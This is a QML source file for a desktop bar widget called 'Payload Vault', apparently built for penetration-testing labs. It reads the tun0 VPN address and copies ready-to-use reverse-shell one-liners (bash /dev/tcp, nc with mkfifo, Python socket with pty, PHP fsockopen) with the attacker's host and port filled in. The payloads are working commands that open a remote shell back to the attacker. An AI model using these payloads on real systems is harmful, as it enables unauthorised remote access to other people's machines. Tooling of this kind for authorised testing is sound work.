import QtQuick
import Quickshell
import Quickshell.Io
import qs.Commons
import qs.Commons as Commons
import qs.Ui

Panel {
  id: root
  moduleName: "raqune.payload-vault"
  implicitWidth: button.implicitWidth
  implicitHeight: button.implicitHeight

  property string tun0Ip: "10.10.14.X"
  property string lport: "4444"

  Process {
    id: tunChecker
    command: ["sh", "-c", "ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\\s)\\d+(\\.\\d+){3}' || echo ''"]
    running: false
    stdout: StdioCollector {
      waitForEnd: true
      onStreamFinished: {
        var ip = text.trim()
        if (ip !== "") root.tun0Ip = ip
      }
    }
  }

  Timer {
    interval: 3000
    running: true
    repeat: true
    triggeredOnStart: true
    onTriggered: { if (!tunChecker.running) tunChecker.running = true }
  }

  function copyPayload(str, title) {
    var finalStr = str.replace(/\$LHOST/g, root.tun0Ip).replace(/\$LPORT/g, root.lport)
    Util.execArgv(["sh", "-c", "printf '%s' \"$1\" | wl-copy && omarchy-notification-send 'Payload Vault' \"Copied $2 payload\"", "copy", finalStr, title])
  }

  readonly property var payloads: [
    { title: "Bash -i", code: "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" },
    { title: "nc mkfifo", code: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f" },
    { title: "Python3 PTY", code: "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'" },
    { title: "PHP exec", code: "php -r '$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" },
    { title: "TTY Upgrade", code: "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'; export TERM=xterm-256color" }
  ]

  BarIconButton {
    id: button
    anchors.fill: parent
    bar: root.bar
    slotSize: Style.bar.statusSlot
    tooltipText: "Payload Vault (" + root.tun0Ip + ":" + root.lport + ")"
    iconComponent: Component {
      Image {
        cache: false
        source: Qt.resolvedUrl("payload-vault-cad.svg")
        fillMode: Image.PreserveAspectFit
        smooth: true
      }
    }
    onPressed: function(b) { root.toggle() }
  }

  KeyboardPanel {
    id: panel
    anchorItem: button
    owner: root
    bar: root.bar
    open: root.opened
    focusTarget: keyCatcher
    contentWidth: panel.fittedContentWidth(Style.space(360))
    contentHeight: panel.fittedContentHeight(column.implicitHeight)

    PanelKeyCatcher {
      id: keyCatcher
      anchors.fill: parent
      onCloseRequested: root.close()
      onTabRequested: function(direction) { root.switchPanel(direction) }

      Column {
        id: column
        anchors.left: parent.left
        anchors.right: parent.right
        anchors.top: parent.top
        spacing: Style.space(10)

        PanelHero {
          width: parent.width
          title: "Payload Vault"
          meta: "LHOST: " + root.tun0Ip + " · LPORT: " + root.lport
          detail: "READY"
          foreground: Commons.Color.foreground
          iconComponent: Component {
            Image {
              width: Style.space(24)
              height: Style.space(24)
              cache: false
              source: Qt.resolvedUrl("payload-vault-cad.svg")
              fillMode: Image.PreserveAspectFit
            }
          }
        }

        PanelSeparator { foreground: Commons.Color.foreground }

        Repeater {
          model: root.payloads
          delegate: Row {
            required property var modelData
            width: column.width
            spacing: Style.space(8)

            Button {
              width: Style.space(110)
              text: modelData.title
              bordered: true
              onClicked: root.copyPayload(modelData.code, modelData.title)
            }

            Text {
              textFormat: Text.PlainText
              text: modelData.code
              color: Qt.darker(Commons.Color.foreground, 1.4)
              font.family: Style.font.family
              font.pixelSize: Style.font.caption
              elide: Text.ElideRight
              width: column.width - Style.space(120)
              anchors.verticalCenter: parent.verticalCenter
            }
          }
        }
      }
    }
  }
}
